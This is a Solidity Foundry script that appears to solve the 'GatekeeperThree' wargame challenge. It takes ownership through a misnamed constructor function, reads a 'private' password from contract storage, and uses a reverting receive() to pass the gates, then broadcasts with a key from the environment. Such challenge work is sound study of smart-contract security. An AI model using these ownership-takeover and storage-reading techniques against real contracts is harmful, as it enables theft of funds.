// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import { GatekeeperThree } from "../src/GatekeeperThree.sol";

contract Player {

	GatekeeperThree public instance;
	uint256 password;

	constructor (address _instance) payable {
		instance = GatekeeperThree(payable(_instance));
	}

	function enterTheGate1() external {


		address(instance).call{value: 0.01 ether}("");

		instance.construct0r();
		instance.createTrick();

	}

	function enterTheGate2(uint256 password) external {

		instance.getAllowance(block.timestamp);
		instance.enter();

	}

	receive () external payable {
		revert();
	}

}

contract GatekeeperThreeSolver is Script {
	
	GatekeeperThree public instance = GatekeeperThree(payable(0x8bB11aF9B6d7AB86445Ddc97bb17D04bdd6d6c33));//x9CA90eE54Ce749d00eF4D334c2D9C250b5027B04));
	// GatekeeperThree public instance = new GatekeeperThree();

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

	function run () external {

		vm.startBroadcast(prv);


		// ======= TESTS =========


		Player playA = new Player{value: 0.01 ether}(address(instance));



		//console.log(payable(address(playA)).send(0.001 ether));
		console.logBytes32(bytes32(address(instance).balance));

		playA.enterTheGate1();
		uint256 password = uint256(vm.load(address(instance.trick()), bytes32(uint256(2))));
		playA.enterTheGate2(password);

		console.logBytes32(bytes32(address(instance).balance));

		console.log("the operation is a success ? ---> ", instance.entrant() == me);
		console.log("the operation is a success ? ---> ", instance.entrant());


		vm.stopBroadcast();


	}

}
